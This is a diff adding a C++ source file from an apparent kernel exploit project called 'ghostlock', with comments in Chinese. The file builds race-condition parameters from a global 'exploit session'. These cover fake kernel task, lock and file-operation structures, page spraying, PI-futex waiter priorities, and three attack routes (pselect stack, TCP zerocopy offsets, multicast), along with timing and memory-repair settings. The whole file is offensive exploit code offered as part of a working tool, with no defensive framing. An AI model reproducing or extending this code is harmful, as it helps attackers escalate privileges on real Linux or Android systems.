@@ -1,0 +1,176 @@
+/**
+ * @file race_session.cpp.disabled
+ * @brief 已停用：PI 参数/路由的会话适配器（逻辑迁 Kotlin）。
+ * @note 恢复：mv race_session.cpp.disabled race_session.cpp。
+ */
+#include "race.h"
+#include "session.h"
+#include "route.h"
+#include "profile.h"
+#include "support.h"
+#include "log.h"
+#include "memory.h"
+#include "params.h"
+#include "route_select.h"
+
+using namespace ghostlock;
+
+namespace ghostlock::race {
+    /**
+     * @brief 会话适配器：唯一读取 `g_exploit_session` 的入口（Kotlin 传参后删除）。
+     */
+    core::RaceRunParams race_run_params_for(
+        session::ExploitSession &s, const memory::WriteRequest &request,
+        const core::PageSprayInputs *spray) {
+        const profile::SelectStackLayout select_layout = s.profile.select_stack_layout();
+        core::RaceRunParams params{};
+        core::ThreadArgs &a = params.args;
+
+        a.route.kind = s.profile.route() == profile::RouteKind::SelectStack
+                           ? 0
+                           : (s.profile.route() == profile::RouteKind::TcpZerocopy ? 1 : 2);
+        const profile::RouteKind fb = s.profile.fallback_route();
+        a.route.fallback_kind = fb == profile::RouteKind::Auto
+                                    ? -1
+                                    : (fb == profile::RouteKind::SelectStack
+                                           ? 0
+                                           : (fb == profile::RouteKind::TcpZerocopy ? 1 : 2));
+        a.route.select = {
+            .page = {
+                .base = (s.heap.current.base),
+                .last_mm_struct = (s.heap.current.last_mm_struct),
+                .fake_lock = (s.heap.current.fake_lock),
+                .fake_w0 = (s.heap.current.fake_w0),
+                .fake_task = (s.heap.current.fake_task),
+                .fake_parent = (s.heap.current.fake_parent),
+                .fake_right = (s.heap.current.fake_right),
+                .fake_left = (s.heap.current.fake_left),
+                .fake_fops = (s.heap.current.fake_fops),
+            },
+            .race = {},
+            .request = request,
+            .waiter_shift = s.profile.loaded()
+                                ? select_layout.waiter_shift.value_or(0)
+                                : kernel::PSELECT_WAITER_WORD_SHIFT,
+            .compact_waiter = select_layout.compact_waiter.value_or(0) ? 1 : 0,
+            .timeout_us = s.profile.select_timeout_us(),
+            .enter_delay_us = s.profile.select_enter_delay_us(),
+            .waiter_prio = kernel::FAKE_WAITER_PRIO,
+            .nfds = PSELECT_ROUTE_NFDS,
+            .stdio_backup = route::standard_io_backup_snapshot(),
+            .spray = spray,
+            /* TODO(P3-kotlin-params)：以下投影值在 Kotlin 传参落地后由 profile 提供。 */
+            .attempts_compact = 4,
+            .attempts_plain = 1,
+            .disarm_spin = 2000,
+            .disarm_poll_us = 1000,
+            .delay_ladder = core::kSelectDelayLadderUs.data(),
+            .delay_ladder_len = static_cast<std::uint32_t>(core::kSelectDelayLadderUs.size()),
+            .waiter_wake_prio_low_bits = 3,
+            .waiter_tree_prio = 1,
+            .waiter_pi_prio = 1,
+            .waiter_wake_state = 3,
+        };
+        a.route.tcp = {
+            .page = a.route.select.page,
+            .race = {},
+            .request = request,
+            .attempts = s.profile.tcp_attempts(),
+            .arm_sequence = s.profile.tcp_arm_sequence(),
+            .post_hold = s.profile.tcp_post_receive_hold_iterations(),
+            .mapping_length = 16u * 1024u * 1024u,
+            .waiter_task = spray->init_task_alias,
+            /* TODO(P3-kotlin-params)：以下投影值在 Kotlin 传参落地后由 profile 提供。 */
+            .zerocopy_request_size = 0x40,
+            .zc_address_offset = 0x18,
+            .zc_length_offset = 0x20,
+            .zc_task_offset = 0x28,
+            .zc_lock_offset = 0x30,
+            .sendbuf_size = 64,
+            .sendbuf_fill = 0x33,
+            .punch_phase_spin = 10000000,
+            .log_every = 100,
+            .mapping_fill = 0x55,
+        };
+        a.route.multicast = {
+            .layout = s.profile.multicast_layout(),
+            .fake_task = (s.heap.current.fake_task),
+            .fake_lock = (s.heap.current.fake_lock),
+            .consumer_calls = &s.race.consumer_calls,
+            .consumer_success = &s.race.consumer_success,
+            .consumer_stop = &s.race.consumer_stop,
+            .consumer_go = &s.race.consumer_go,
+            .consumer_inflight = &s.race.consumer_inflight,
+            .route_delay_usec = &s.race.route_delay_usec,
+            .attempts = static_cast<std::int32_t>(
+                s.profile.execution() ? s.profile.execution()->mcast_attempts : 0),
+            .arm_sequence = static_cast<std::int32_t>(
+                s.profile.execution() ? s.profile.execution()->mcast_arm_sequence : 0),
+            .arm_hold = static_cast<std::int32_t>(
+                s.profile.execution() ? s.profile.execution()->mcast_arm_hold : 0),
+            .sockaddr_family_offset = 8,
+        };
+
+        a.race = {
+            .consumer_calls = &s.race.consumer_calls,
+            .consumer_success = &s.race.consumer_success,
+            .consumer_stop = &s.race.consumer_stop,
+            .consumer_go = &s.race.consumer_go,
+            .consumer_inflight = &s.race.consumer_inflight,
+            .waiter_tid = &s.race.waiter_tid,
+            .waiter_ready = &s.race.waiter_ready,
+            .waiter_waiting = &s.race.waiter_waiting,
+            .owner_started = &s.race.owner_started,
+            .owner_chain_done = &s.race.owner_chain_done,
+            .owner_stop = &s.race.owner_stop,
+            .route_done = &s.race.route_done,
+            .fast_repair = &s.race.fast_repair,
+            .route_delay_usec = &s.race.route_delay_usec,
+        };
+        a.route.select.race = a.race;
+        a.route.tcp.race = a.race;
+        a.wait_futex = &s.race.wait_futex;
+        a.target_futex = &s.race.target_futex;
+        a.chain_futex = &s.race.chain_futex;
+        a.poll_us = s.profile.race_state_poll_interval_us();
+        a.route_wait_ms = s.profile.race_route_wait_ms();
+        a.ghost_disarm = route::route_needs_ghost_disarm(s.profile) ? 1 : 0;
+        a.consumer_burst = s.profile.select_consumer_burst_calls();
+        a.consumer_max = s.profile.select_consumer_max_calls();
+        a.consumer_nice = kernel::PSELECT_CONSUMER_NICE;
+        a.consumer_cpu = s.race.consumer_cpu;
+        a.compact_waiter = s.profile.has_compact_waiter() ? 1 : 0;
+
+        /* TODO(P3-kotlin-params)：以下 7 项在 Kotlin 传参落地前保持旧实现值，
+         * 完成后由 profile/ExecutionSettings 提供并删除本段。目标函数已不再
+         * 持有这些字面量，本适配器是唯一投影点。 */
+        a.fast_repair_delay_us = 5000U;
+        a.fast_repair_window_ns = 20000000U;
+        a.owner_idle_sleep_s = 1U;
+        a.consumer_nice_base = 1U;
+        a.consumer_nice_span = 19U;
+        a.consumer_lock_pi_spin_ns = 50000000U;
+        a.ghost_disarm_flag = 0x80000000U;
+
+        params.setup_settle_us = s.profile.race_setup_settle_us();
+        params.route_done_timeout_ms = s.profile.race_route_done_timeout_ms();
+        params.enter_delay_us = s.profile.select_enter_delay_us();
+        params.main_cpu = s.race.main_cpu;
+        params.consumer_cpu = s.race.consumer_cpu;
+        params.preserve_fast_repair = 1;
+        params.spray = spray;
+        return params;
+    }
+
+    /* 过渡适配器：仍读进程级会话；原子入口用 `race_run_params_for`。 */
+    core::RaceRunParams race_run_params_from_session(
+        const memory::WriteRequest &request, const core::PageSprayInputs *spray) {
+        return race_run_params_for(session::g_exploit_session, request, spray);
+    }
+
+    bool run_main_route_threads_from_session(const memory::WriteRequest &request) {
+        core::PageSprayInputs spray = support::page_spray_inputs_from_session(request);
+        core::RaceRunParams params = race_run_params_from_session(request, &spray);
+        return run_main_route_threads(params).code == route::ROUTE_OK;
+    }
+} // namespace ghostlock::race
